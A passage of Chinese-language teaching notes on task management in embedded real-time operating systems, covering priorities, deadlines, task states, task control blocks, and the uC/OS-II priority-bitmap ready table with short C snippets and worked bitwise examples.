\u98de\u884c\u5668\u4e2d\u5904\u7406\u7a33\u5b9a\u6027\u63a7\u5236\u7684\u4efb\u52a1\uff0c\u5c31\u9700\u8981\u5177\u6709\u8f83\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u4e00\u65e6\u6267\u884c\u6761\u4ef6\u5f97\u5230\u6ee1\u8db3\uff0c\u5e94\u53ca\u65f6\u5f97\u5230\u6267\u884c \u5206\u7c7b \uff1a\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5206\u4e3a\u9759\u6001\u4f18\u5148\u7ea7\u548c\u52a8\u6001\u4f18\u5148\u7ea7\u3002 \u9759\u6001\u4f18\u5148\u7ea7 \uff1a\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u88ab\u786e\u5b9a\u540e\uff0c\u5728\u7cfb\u7edf\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u5c06\u4e0d\u518d\u53d1\u751f\u53d8\u5316 \u52a8\u6001\u4f18\u5148\u7ea7 \uff1a\u7cfb\u7edf\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u662f\u53ef\u4ee5\u52a8\u6001\u53d8\u5316\u7684 \u6570\u91cf \uff1auCOS-II\u4e2d\u5171\u53ef\u7ba1\u740664\u4e2a\u4efb\u52a1\uff0c\u6bcf\u4e2a\u4efb\u52a1\u5fc5\u987b\u6709\u4e0d\u540c\u7684\u4f18\u5148\u7ea7\u3002uCOS-III\u4e2d\u5df2\u7ecf\u53ef\u4ee5\u652f\u6301\u540c\u4e00\u4f18\u5148\u7ea7\u6709\u591a\u4e2a\u4efb\u52a1\uff0c\u4e14\u53ef\u4ee5\u81ea\u884c\u8bbe\u7f6e\u4f18\u5148\u7ea7\u7684\u4e2a\u6570 \u5468\u671f \u5468\u671f \uff1a\u5468\u671f\u4efb\u52a1\u6240\u5177\u6709\u7684\u53c2\u6570\uff0c\u8868\u793a\u4efb\u52a1\u5468\u671f\u6027\u6267\u884c\u7684\u95f4\u9694\u65f6\u95f4 \u4efb\u52a1\u7684\u8ba1\u7b97\u65f6\u95f4 \u4efb\u52a1\u5728 \u7279\u5b9a\u786c\u4ef6\u73af\u5883 \u4e0b\u88ab\u5b8c\u6574\u6267\u884c\u6240\u9700\u8981\u7684\u65f6\u95f4\uff0c\u4e5f\u88ab\u79f0\u4e3a\u662f\u4efb\u52a1\u7684\u6267\u884c\u65f6\u95f4\uff08execution time\uff09 \u7531\u4e8e\u4efb\u52a1\u6bcf\u6b21\u6267\u884c\u7684\u8f6f\u4ef6\u73af\u5883\u7684 \u5dee\u5f02\u6027 \uff0c\u5bfc\u81f4\u4efb\u52a1\u5728\u5404\u6b21\u5177\u4f53\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684\u8ba1\u7b97\u65f6\u95f4\u5404\u6709\u4e0d\u540c\u3002 \u901a\u5e38\u7528 \u6700\u574f\u60c5\u51b5\u4e0b \u7684\u6267\u884c\u65f6\u95f4\uff08worst case time\uff09\u6216\u662f\u9700\u8981\u7684 \u6700\u957f\u6267\u884c\u65f6\u95f4 \u6765\u8868\u793a\uff0c\u4e5f\u53ef\u7528 \u7edf\u8ba1\u65f6\u95f4 \uff08statistical time\uff09\u6765\u8868\u793a\u3002 \u4efb\u52a1\u7684\u5c31\u7eea\u65f6\u95f4 \u4efb\u52a1\u5177\u5907\u4e86\u5728\u5904\u7406\u5668\u4e0a\u88ab\u6267\u884c\u6240\u9700\u8981\u6761\u4ef6\u65f6\u7684\u65f6\u95f4 \u622a\u6b62\u65f6\u95f4 \u5b9a\u4e49\uff1a\u610f\u5473\u7740\u4efb\u52a1\u9700\u8981\u5728\u8be5\u65f6\u95f4\u5230\u6765\u4e4b\u524d\u88ab\u6267\u884c\u5b8c\u6210\u3002 \u5206\u7c7b\uff1a \u622a\u6b62\u65f6\u95f4\u53ef\u4ee5\u901a\u8fc7\u7edd\u5bf9\u622a\u6b62\u65f6\u95f4\uff08absolute deadline\uff09\u548c\u76f8\u5bf9\u622a\u6b62\u65f6\u95f4\uff08relative time\uff09\u4e24\u79cd\u65b9\u5f0f\u6765\u8868\u793a\u3002\u76f8\u5bf9\u622a\u6b62\u65f6\u95f4\u4e3a\u4efb\u52a1\u7684\u7edd\u5bf9\u622a\u6b62\u65f6\u95f4\u51cf\u53bb\u4efb\u52a1\u7684\u5c31\u7eea\u65f6\u95f4\u3002 \u622a\u6b62\u65f6\u95f4\u53ef\u4ee5\u5206\u4e3a\u5f3a\u622a\u6b62\u65f6\u95f4\uff08hard deadline\uff09\u548c\u5f31\u622a\u6b62\u65f6\u95f4\uff08soft deadline\uff09\u4e24\u79cd\u60c5\u51b5\uff1a \u5177\u6709\u5f3a\u622a\u6b62\u65f6\u95f4\u7684\u4efb\u52a1\u5373\u4e3a\u5173\u952e\u4efb\u52a1\uff0c\u5982\u679c\u622a\u6b62\u65f6\u95f4\u4e0d\u80fd\u5f97\u5230\u6ee1\u8db3\uff0c\u5c31\u4f1a\u51fa\u73b0\u4e25\u91cd\u7684\u540e\u679c\u3002 \u62e5\u6709\u5173\u952e\u4efb\u52a1\u7684\u5b9e\u65f6\u7cfb\u7edf\u53c8\u88ab\u79f0\u4e3a\u5f3a\u5b9e\u65f6\uff08hard real-time\uff09 \u7cfb\u7edf\uff0c\u5426\u5219\u79f0\u4e3a\u5f31\u5b9e\u65f6\uff08soft real-time\uff09\u7cfb\u7edf\u3002 5. \u4efb\u52a1\u7684\u72b6\u6001\u4e0e\u53d8\u8fc1 # \u4efb\u52a1\u62e5\u6709\u7684\u8d44\u6e90\u60c5\u51b5\u662f\u4e0d\u65ad\u53d8\u5316\u7684\uff0c\u5bfc\u81f4\u4efb\u52a1\u72b6\u6001\u4e5f\u8868\u73b0\u51fa\u4e0d\u65ad\u53d8\u5316\u7684\u7279\u6027\u3002 \u4e0d\u540c\u7684\u5b9e\u65f6\u5185\u6838\u5b9e\u73b0\u65b9\u5f0f\u5bf9\u4efb\u52a1\u72b6\u6001\u7684\u5b9a\u4e49\u4e0d\u5c3d\u76f8\u540c\uff0c\u4f46\u662f\u90fd\u53ef\u4ee5\u6982\u62ec\u4e3a\u4e09\u79cd\u57fa\u672c \u7684\u72b6\u6001 \u7b49\u5f85 \uff08waiting\uff09\uff1a\u4efb\u52a1\u5728\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\u7684\u53d1\u751f\uff1b \u5c31\u7eea \uff08ready\uff09\uff1a \u4efb\u52a1\u7b49\u5f85\u83b7\u5f97\u5904\u7406\u5668\u8d44\u6e90\uff1b \u6267\u884c \uff08running\uff09\uff1a\u4efb\u52a1\u83b7\u5f97\u5904\u7406\u5668\u8d44\u6e90\uff0c\u6240\u5305\u542b\u7684\u4ee3\u7801\u5185\u5bb9\u6b63\u5728\u88ab\u6267\u884c\u3002 \u5355\u5904\u7406\u5668\u7cfb\u7edf\u4e2d\u4efb\u52a1\u7684\u7279\u70b9\uff1a \u4efb\u4f55\u65f6\u5019\u90fd\u53ea\u6709\u4e00\u4e2a\u4efb\u52a1\u5728CPU\u4e2d\u6267\u884c\u3002\u65e0\u4e8b\u65f6\u5c31\u8fd0\u884c\u7a7a\u95f2\u4efb\u52a1\u6267\u884c\u7a7a\u64cd\u4f5c\u3002 \u4efb\u4f55\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u4efb\u52a1\u90fd\u5fc5\u987b\u5904\u4e8e\u5c31\u7eea\u72b6\u6001\u3002 \u8c03\u5ea6\u7a0b\u5e8f\u4ece\u4efb\u52a1\u7684\u5c31\u7eea\u961f\u5217\u4e2d\u9009\u62e9\u4e0b\u4e00\u4e2a\u9700\u8981\u6267\u884c\u7684\u4efb\u52a1\u3002 \u5904\u4e8e\u5c31\u7eea\u72b6\u6001\u7684\u4efb\u52a1\u62e5\u6709\u9664CPU\u4ee5\u5916\u7684\u5176\u4ed6\u6240\u6709\u9700\u8981\u7684\u8d44\u6e90\u3002 \u5982\u679c\u4efb\u52a1\u5728\u9700\u8981\u7b49\u5f85I/O\u8bbe\u5907\u6216\u5176\u4ed6\u4efb\u52a1\u63d0\u4f9b\u7684\u6570\u636e\uff0c\u5c31\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002 \\text{Figure 5. \u4efb\u52a1\u7684\u72b6\u6001\u4e0e\u53d8\u8fc1} \\text{Figure 6. \u4e09\u4e2a\u4efb\u52a1\u8fdb\u884c\u72b6\u6001\u8f6c\u6362\u7684\u8fc7\u7a0b} \\text{Figure 7. \u72b6\u6001\u53d8\u8fc1\u56fe} 6. \u4efb\u52a1\u63a7\u5236\u5757 # \u5b9a\u4e49 \uff1a\u4efb\u52a1\u63a7\u5236\u5757\u662f\u5305\u542b\u4efb\u52a1\u76f8\u5173\u4fe1\u606f\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5b83\u5305\u542b\u4e86\u4efb\u52a1\u6267\u884c\u8fc7\u7a0b\u4e2d\u6240\u9700\u8981\u7684\u6240\u6709\u4fe1\u606f \u4f5c\u7528 \uff1a\u4efb\u52a1\u7ba1\u7406\u662f\u901a\u8fc7\u5bf9\u4efb\u52a1\u63a7\u5236\u5757\uff08Task Control Block\uff0cTCB\uff09\u7684\u64cd\u4f5c\u6765\u5b9e\u73b0\u7684\u3002 \u5185\u5bb9 \uff1a\u4efb\u52a1\u63a7\u5236\u5757\u5927\u90fd\u5305\u62ec\u4ee5\u4e0b\u4fe1\u606f\uff1a \u4efb\u52a1\u7684\u540d\u5b57 \u4efb\u52a1\u6267\u884c\u7684\u8d77\u59cb\u5730\u5740 \u4efb\u52a1\u7684\u4f18\u5148\u7ea7 \u4efb\u52a1\u7684\u72b6\u6001 \u4efb\u52a1\u7684\u786c\u4ef6\u4e0a\u4e0b\u6587 \u5806\u6808\u6307\u9488\u3001PC\u548c\u5bc4\u5b58\u5668\u7b49 \u4efb\u52a1\u7684\u961f\u5217\u6307\u9488\u7b49\u5185\u5bb9 7. \u5c31\u7eea\u7b97\u6cd5 # \u5f53\u6709\u591a\u4e2a\u4efb\u52a1\u540c\u65f6\u5c31\u7eea\u65f6\uff0c\u5185\u6838\u5229\u7528\u7279\u5b9a\u7684\u7b97\u6cd5\u6c42\u51fa\u5f53\u524d\u5177\u6709\u6700\u9ad8\u4f18\u5148\u7ea7\u7684\u5c31\u7eea\u4efb\u52a1\u3002 \u5728\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u5e38\u7528\u7684\u5c31\u7eea\u7b97\u6cd5\u662f\u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5\u3002\u6211\u4eec\u4ee5uC/OS-II\u4e2d\u7684\u5b9e\u73b0\u4e3a\u4f8b\u6765\u8fdb\u884c\u8bb2\u8ff0\u3002 7.1. \u5c31\u7eea\u8868 # \\text{Figure 8. \u5c31\u7eea\u8868} 7.2. \u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5 # 7.2.1. \u4f18\u5148\u7ea7\u4f4d\u56fe # \\text{Figure 9. \u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5} 7.2.2. \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001 # \\text{Figure 10. \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001} // \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001 OSRdyGrp |= OSMapTbl[priority >> 3]; OSRdyTbl[priority >> 3] |= OSMapTbl[priority & 0x07]; \u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b\u7b2c\u4e00\u884c\u4ee3\u7801\u3002\u5982\u56fe10\u4e2d\u6240\u793a\uff0c\u4efb\u52a1\u4f18\u5148\u7ea7\u4e3a35\u65f6\uff0c\u9996\u5148\u5c0635\u5316\u4e3a\u4e8c\u8fdb\u5236 priority = (00100011)_B \u5c06 priority \u53f3\u79fb\u4e09\u4f4d\uff0c\u5219\u5f97\u523035\u5728 OSMapTbl \u4e2d\u7684\u5bf9\u5e94\u4f4d\u7f6e priority \\gg 3 = (00100)_B = (4)_D \u4ece OSMapTbl \u8868\u4e2d\u8fdb\u884c\u7d22\u5f15 \\text{OSMapTbl[4]} = (00010000)_B \u5047\u8bbe OSRdyGrp \u4e3a\u5168 0 \uff0c \\text{OSMapTbl[4]} \u548c OSRdyGrp \u505a\u6216\u8fd0\u7b97 OSRdyGrp \uff5c (00010000)_B = (00010000)_B OSRdyGrp \u6807\u793a\u4e86\u67d0\u4e2a\u6216\u591a\u4e2a\u5c31\u7eea\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5728 OSRdyTbl[4] \u8fd9\u4e00\u884c\u4e2d\u3002 \u63a5\u7740\u770b\u7b2c\u4e8c\u884c\u4ee3\u7801 // \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001 OSRdyTbl[priority >> 3] |= OSMapTbl[priority & 0x07]; \\text{0x07} = (00000111)_B priority \u548c \\text{0x07} \u76f8\u4e0e\uff0c\u5373\u53d6 priority \u7684\u540e\u4e09\u4f4d\u4e8c\u8fdb\u5236\uff0c\u6b64\u5904\u4e3a (011)_B \uff0c\u5373 (3)_D \uff0c\u67e5\u8868\u53ef\u5f97 \\text{OSMapTbl}[3] = (00001000)_B \u5047\u8bbe OSRdyTbl[4] \u4e3a\u51680\uff0c \\text{OSMapTbl}[3] \u4e0e OSRdyTbl[4] \u76f8\u6216 \\text{OSRdyTbl[4]} \\ | \\ (00001000)_B = (00001000)_B \u518d\u653e\u5165 OSRdyTbl[4] \u4e2d\uff0c\u6807\u793a\u4e86\u5c31\u7eea\u7684\u4efb\u52a1\u4f18\u5148\u7ea7\u4e3a35\u3002 7.2.3. \u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001 # \\text{Figure 11. \u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001} if((OSRdyTbl[priority >> 3] &= ~OSMapTbl[priority & 0x07]) == 0) OSRdyGrp &= ~OSMapTbl[priority >> 3]; \u63a5\u7740\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5f53\u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001\u65f6 \\text{OSMapTbl}[3] = (00001000)_B ~ \u653e\u5728\u6570\u5b57\u524d\u8868\u793a\u53d6\u53cd \uff5e\\text{OSMapTbl}[3] = (11110111)_B \u4e0e OSRdyTbl[4] \u76f8\u4e0e \\text{OSRdyTbl[4]} \\ \\& \\ (11110111)_B = (00000000)_B = (0)_D \u6ee1\u8db3 if \u8bed\u53e5\u4e2d\u7684\u6761\u4ef6\uff0c\u5219 { \\begin{aligned} \\text{OSRdyGrp} &= \\text{OSRdyGrp}\\ \\& ~(00010000)_B & \\\\ &= (00010000)_B \\ \\& \\ (11101111)_B & \\\\ &= (00000000)_B \\ & \\\\ &= (0)_D \\ & \\\\ \\end{aligned} } 7.2.4. \u4f18\u5148\u7ea7\u5224\u5b9a\u8868 # \\text{Figure 12. \u4f18\u5148\u7ea7\u5224\u5b9a\u8868} 7.2.5. \u83b7\u53d6\u8fdb\u5165\u5c31\u7eea\u6001\u7684\u6700\u9ad8\u4f18\u5148\u7ea7 # y = OSUnMapTbl[OSRdyGrp]; x = OSUnMapTbl[OSRdyTbl[y]]; priority = (y << 3) + x; \\text{Figure 13. \u83b7\u53d6\u8fdb\u5165\u5c31\u7eea\u6001\u7684\u6700\u9ad8\u4f18\u5148\u7ea7} 8. \u4efb\u52a1\u8c03\u5ea6 # 8.1. \u6982\u8ff0 # uC/OS-II\u603b\u662f\u9009\u62e9\u5c31\u7eea\u6001\u4efb\u52a1\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u6267\u884c \u7531\u8c03\u5ea6\u5668\u6765\u786e\u5b9a\u54ea\u4e2a\u4efb\u52a1\u4f18\u5148\u7ea7\u6700\u9ad8\u548c\u8fdb\u884c\u8c03\u5ea6\u5207\u6362 \u4efb\u52a1\u7ea7\u8c03\u5ea6\u662f\u7531\u51fd\u6570 OS_Sched() \u5b8c\u6210 \u4e2d\u65ad\u7ea7\u7684\u8c03\u5ea6\u662f\u7531\u51fd\u6570 OSIntExit() \u5b8c\u6210\u7684 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cuC/OS-II\u7684\u8c03\u5ea6\u6267\u884c\u65f6\u95f4\u662f\u786e\u5b9a\u7684\u5e38\u6570\uff0c\u4e0e\u5e94\u7528\u7a0b\u5e8f\u5efa\u7acb\u7684\u4efb\u52a1\u6570\u91cf\u4ee5\u53ca\u5f53\u524d\u6700\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u4f4d\u7f6e\u6ca1\u6709\u5173\u7cfb 8.2. \u4efb\u52a1\u5207\u6362 # \\text{Figure 14. \u4efb\u52a1\u5207\u6362} 8.3. \u4efb\u52a1\u5207\u6362\u7684\u57fa\u672c\u6b65\u9aa4 # \u4fdd\u5b58\u4efb\u52a1 \u4e0a\u4e0b\u6587 \u73af\u5883 \u66f4\u65b0\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u7684 \u63a7\u5236\u5757 \u5185\u5bb9\uff0c\u5c06\u5176\u72b6\u6001\u6539\u4e3a\u5c31\u7eea\u6216\u7b49\u5f85\u72b6\u6001 \u5c06\u4efb\u52a1\u63a7\u5236\u5757\u79fb\u5230\u76f8\u5e94\u961f\u5217\uff08\u5c31\u7eea\u961f\u5217\u6216\u7b49\u5f85\u961f\u5217\uff0c\u6216\u8fdb\u884c\u4f4d\u56fe\u64cd\u4f5c\uff09 \u9009\u62e9\u53e6\u4e00\u4e2a\u4efb\u52a1\u8fdb\u884c\u6267\u884c(\u8c03\u5ea6) \u6539\u53d8\u9700\u6295\u5165\u8fd0\u884c\u4efb\u52a1\u7684\u63a7\u5236\u5757\u5185\u5bb9\uff0c\u5c06\u5176\u72b6\u6001\u53d8\u4e3a \u8fd0\u884c\u72b6\u6001 \u6062\u590d\u9700\u6295\u5165\u8fd0\u884c\u4efb\u52a1\u7684\u4e0a\u4e0b\u6587\u73af\u5883 8.4. \u4efb\u52a1\u5207\u6362\u7684\u65f6\u673a # \u4e2d\u65ad\u3001\u81ea\u9677(Traps) \u6b63\u5728\u8fd0\u884c\u4efb\u52a1\u56e0\u7f3a\u4e4f\u8d44\u6e90\u800c\u963b\u585e \u65f6\u95f4\u7247\u8f6e\u8f6c\u8c03\u5ea6\u65f6\u65f6\u95f4\u7247\u7528\u5c3d \u66f4\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u5c31\u7eea 9. \u4efb\u52a1\u7ba1\u7406\u673a\u5236 # 9.1. \u4e3b\u8981\u4efb\u52a1\u7ba1\u7406\u529f\u80fd # \u521b\u5efa\u4efb\u52a1 \u7684\u8fc7\u7a0b\u5373\u4e3a\u5206\u914d\u4efb\u52a1\u63a7\u5236\u5757\u7684\u8fc7\u7a0b\u3002 \u5728\u521b\u5efa\u4efb\u52a1\u65f6\uff0c\u901a\u5e38\u9700\u8981\u786e\u5b9a\u4efb\u52a1\u7684\u540d\u5b57\u548c\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u7b49\u5185\u5bb9\uff0c \u786e\u7acb\u4efb\u52a1\u6240\u80fd\u4f7f\u7528\u7684\u5806\u6808\u533a\u57df\u3002 \u4efb\u52a1\u521b\u5efa\u6210\u529f\u540e\uff0c\u901a\u5e38\u4f1a\u4e3a\u7528\u6237\u8fd4\u56de\u4e00\u4e2a\u6807\u8bc6\u8be5\u4efb\u52a1\u7684ID\uff0c\u4ee5\u5b9e \u73b0\u5bf9\u4efb\u52a1\u7684\u5f15\u7528\u7ba1\u7406\u3002 \u5220\u9664\u4efb\u52a1 \u628a\u4efb\u52a1\u4ece\u7cfb\u7edf\u4e2d\u53bb\u6389\uff0c\u91ca\u653e\u5bf9\u5e94\u7684\u4efb\u52a1\u63a7\u5236\u5757\u3002 \u6302\u8d77/\u5524\u9192\u4efb\u52a1 \u628a\u4efb\u52a1\u53d8\u4e3a\u7b49\u5f85\u72b6\u6001\uff0c\u53ef\u901a\u8fc7\u5524\u9192\u4efb\u52a1\u64cd\u4f5c\u628a\u4efb\u52a1\u8f6c \u6362\u4e3a\u5c31\u7eea\u72b6\u6001\u3002 \u8bbe\u7f6e\u4efb\u52a1\u5c5e\u6027 \u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u4efb\u52a1\u7684\u62a2\u5360\u3001\u65f6\u95f4\u7247\u7b49\u7279\u6027\uff0c\u4ee5\u786e\u5b9a\u662f \u5426\u5141\u8bb8\u4efb\u52a1\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u88ab\u62a2\u5360\u6216\u662f\u5bf9\u540c\u4f18\u5148\u7ea7\u4efb\u52a1\u91c7\u7528\u65f6\u95f4\u7247\u8f6e \u8f6c\u65b9\u5f0f\u8fd0\u884c\u7b49\u3002 \u6539\u53d8\u4efb\u52a1\u4f18\u5148\u7ea7 \u7528\u6765\u6839\u636e\u9700\u8981\u6539\u53d8\u4efb\u52a1\u7684\u5f53\u524d\u4f18\u5148\u7ea7\u3002 \u83b7\u53d6\u4efb\u52a1\u4fe1\u606f \u83b7\u5f97\u4efb\u52a1\u7684\u5f53\u524d\u4f18\u5148\u7ea7\u3001\u4efb\u52a1\u7684\u5c5e\u6027\u3001\u4efb\u52a1\u7684\u540d\u5b57\u3001 \u4efb\u52a1\u7684\u4e0a\u4e0b\u6587\u3001\u4efb\u52a1\u7684\u72b6\u6001\u7b49\u5185\u5bb9\uff0c\u4fbf\u4e8e\u7528\u6237\u8fdb\u884c\u51b3\u7b56\u3002 9.2. \u521b\u5efa\u4efb\u52a1 # \u4efb\u52a1\u53ef\u4ee5\u5728\u591a\u4efb\u52a1\u8c03\u5ea6\u5f00\u59cb\u4e4b\u524d\u521b\u5efa\uff0c\u4e5f\u53ef\u4ee5\u5728\u5176\u5b83\u4efb\u52a1\u7684\u6267 \u884c\u8fc7\u7a0b\u4e2d\u521b\u5efa\u3002\u4f46\u4e0d\u80fd\u5728\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u521b\u5efa\u3002\u5f00\u59cb\u591a\u4efb\u52a1\u8c03 \u5ea6\u4e4b\u524d\uff0c\u5fc5\u987b\u81f3\u5c11\u521b\u5efa\u4e00\u4e2a\u4efb\u52a1\u3002 \u5b9a\u4e49 \uff1a\u4efb\u52a1\u521b\u5efa\u4e3a\u4efb\u52a1\u5206\u914d\u548c\u521d\u59cb\u5316\u76f8\u5173\u7684\u6570\u636e\u7ed3\u6784\u3002 \u6240\u9700\u4fe1\u606f \uff1a \u4efb\u52a1\u521b\u5efa \u65f6\u901a\u5e38\u9700\u8981\u4f7f\u7528\u5982\u4e0b \u4fe1\u606f \uff1a \u4efb\u52a1\u7684\u540d\u5b57\u548c\u521d\u59cb\u4f18\u5148\u7ea7 \u4efb\u52a1\u6808 \u4efb\u52a1\u5c5e\u6027 \u4efb\u52a1\u5bf9\u5e94\u7684\u51fd\u6570\u5165\u53e3\u5730\u5740 \u4efb\u52a1\u5bf9\u5e94\u51fd\u6570\u7684\u53c2\u6570\u7b49 \u8fc7\u7a0b \uff1a\u4efb\u52a1\u521b\u5efa\u901a\u5e38\u9700\u8981 \u5b8c\u6210\u4ee5\u4e0b\u5de5\u4f5c \uff1a \u83b7\u5f97\u4efb\u52a1\u63a7\u5236\u5757TCB \u6839\u636e\u5b9e\u65f6\u5185\u6838\u7528\u6237\u63d0\u4f9b\u7684\u4fe1\u606f\u521d\u59cb\u5316TCB \u4e3a\u4efb\u52a1\u5206\u914d\u4e00\u4e2a\u53ef\u4ee5\u552f\u4e00\u6807\u8bc6\u4efb\u52a1\u7684ID \u4f7f\u4efb\u52a1\u5904\u4e8e\u5c31\u7eea\u72b6\u6001\uff0c\u628a\u4efb\u52a1\u653e\u7f6e\u5230\u5c31\u7eea\u961f\u5217 \u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6\u5904\u7406 9.3. \u5806\u6808\u7a7a\u95f4 # \\text{Figure 15. \u5806\u6808\u7a7a\u95f4} 9.4. \u5220\u9664\u4efb\u52a1 # \u5b9a\u4e49 \uff1a\u5185\u6838 \u6839\u636e\u4efb\u52a1\u521b\u5efa\u65f6\u83b7\u5f97\u7684ID\u5220\u9664\u6307\u5b9a\u7684\u4efb\u52a1 \u3002 \u8981\u70b9 \uff1a\u4efb\u52a1\u5220\u9664\u65f6\u9700\u8981 \u91ca\u653e\u8be5\u4efb\u52a1\u6240\u62e5\u6709\u7684\u8d44\u6e90 \u3002\u8fd9\u901a\u5e38\u7531 \u5185\u6838\u548c\u4efb\u52a1\u5171\u540c\u5b8c\u6210 \u3002 \u8fc7\u7a0b \uff1a\u4efb\u52a1\u5220\u9664\u901a\u5e38\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u5de5\u4f5c\uff1a \u6839\u636e\u6307\u5b9a\u7684ID\uff0c\u83b7\u5f97\u5bf9\u5e94\u4efb\u52a1\u7684TCB \u628a\u4efb\u52a1\u7684TCB\u4ece\u961f\u5217\u4e2d\u53d6\u51fa\u6765\uff0c\u6302\u5165\u7a7a\u95f2TCB\u961f\u5217\u91ca\u653e\u4efb\u52a1\u6240\u5360\u7528\u7684\u8d44\u6e90 9.5. \u6302\u8d77\u4efb\u52a1 # \u529f\u80fd \uff1a\u6302\u8d77\u6307\u5b9a\u4efb\u52a1\uff0c\u76f4\u5230\u901a\u8fc7\u5524\u9192\u4efb\u52a1\u5bf9\u4efb\u52a1\u8fdb\u884c\u89e3\u6302\u3002 \u4e00\u4e2a\u4efb\u52a1\u53ef\u4ee5 \u628a\u81ea\u5df1\u6302\u8d77 \u3002 \u5f53\u4efb\u52a1\u628a\u81ea\u5df1\u6302\u8d77\u540e\uff0c\u4f1a\u5f15\u8d77 \u4efb\u52a1\u7684\u8c03\u5ea6 \uff0c\u5b9e\u65f6\u5185\u6838\u5c06\u9009\u53d6\u53e6\u5916\u4e00\u4e2a\u5408\u9002\u7684\u4efb\u52a1\u8fdb\u884c\u6267\u884c\u3002 \u4efb\u52a1\u88ab\u6302\u8d77\u540e\uff0c\u8be5\u4efb\u52a1\u5c06\u5904\u4e8e \u7b49\u5f85\u72b6\u6001\uff08\u6216\u6302\u8d77\u72b6\u6001\uff09 \u3002 \u8fc7\u7a0b \uff1a\u6302\u8d77\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u5de5\u4f5c\uff1a \u6839\u636e\u6307\u5b9a\u7684ID\uff0c\u83b7\u5f97\u5bf9\u5e94\u4efb\u52a1\u7684TCB\uff1b \u628a\u4efb\u52a1\u7684\u72b6\u6001\u53d8\u4e3a\u7b49\u5f85\u72b6\u6001\uff0c\u5e76\u628a\u4efb\u52a1\u4ece\u5c31\u7eea\u961f\u5217\u6216\u5c31\u7eea\u8868\u4e2d\u79fb\u9664\uff1b \u5982\u679c\u4efb\u52a1\u81ea\u5df1\u6302\u8d77\u81ea\u5df1\uff0c\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 9.6. \u89e3\u6302\u4efb\u52a1 # \u529f\u80fd \uff1a\u6839\u636e\u4efb\u52a1ID\u89e3\u6302\u6307\u5b9a\u7684\u4efb\u52a1\u3002 \u5982\u679c \u4efb\u52a1\u8fd8\u5728\u7b49\u5f85\u5176\u4ed6\u8d44\u6e90 \uff0c\u4efb\u52a1\u89e3\u6302\u540e\u4ecd\u7136\u5904\u4e8e\u7b49\u5f85\u72b6\u6001; \u5426\u5219\uff0c\u89e3\u6302\u540e\u7684\u4efb\u52a1\u5c06\u5904\u4e8e\u5c31\u7eea\u72b6\u6001\u3002 \u8fc7\u7a0b \uff1a\u89e3\u6302\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u5de5\u4f5c\uff1a \u6839\u636e\u6307\u5b9a\u7684ID\uff0c\u83b7\u5f97\u5bf9\u5e94\u4efb\u52a1\u7684TCB \u5982\u679c\u4efb\u52a1\u5728\u7b49\u5f85\u5176\u4ed6\u8d44\u6e90\uff0c\u4efb\u52a1\u5c06\u4ecd\u7136\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff1b\u5426\u5219\uff0c\u628a\u4efb\u52a1\u7684\u72b6\u6001\u53d8\u4e3a\u5c31\u7eea\u72b6\u6001\uff0c\u5e76\u628aTCB\u653e\u7f6e\u5230\u5c31\u7eea\u961f\u5217 \u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 9.7. \u4e00\u4e9b\u7279\u6b8a\u7684\u7cfb\u7edf\u4efb\u52a1 # \u7a7a\u95f2\u4efb\u52a1 \uff1a\u662f\u7531\u5185\u6838\u521b\u5efa\u7684\u5728\u6ca1\u6709\u5176\u5b83\u4efb\u52a1\u5c31\u7eea\u65f6\u8fd0\u884c\u7684\u4e00\u79cd\u4efb\u52a1\u3002\u5b83\u7684\u4f18\u5148\u7ea7\u662f\u6700\u4f4e\u7684\uff0c\u4e0d\u80fd\u88ab\u5e94\u7528\u8f6f\u4ef6\u5220\u9664\u3002 \u7edf\u8ba1\u4efb\u52a1 \uff1a\u901a\u5e38\u662f\u7531\u5185\u6838\u521b\u5efa\u7684\u7edf\u8ba1\u8fd0\u884c\u65f6\u95f4\u7684\u4efb\u52a1\u3002\u5b83\u544a\u8bc9\u7528\u6237\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4e86\u591a\u5c11CPU\u65f6\u95f4\uff0c\u901a\u5e38\u7528\u767e\u5206\u6bd4\u6765\u8868\u793a\u3002\uff08 \u6ce8\uff1a uC/OS-II 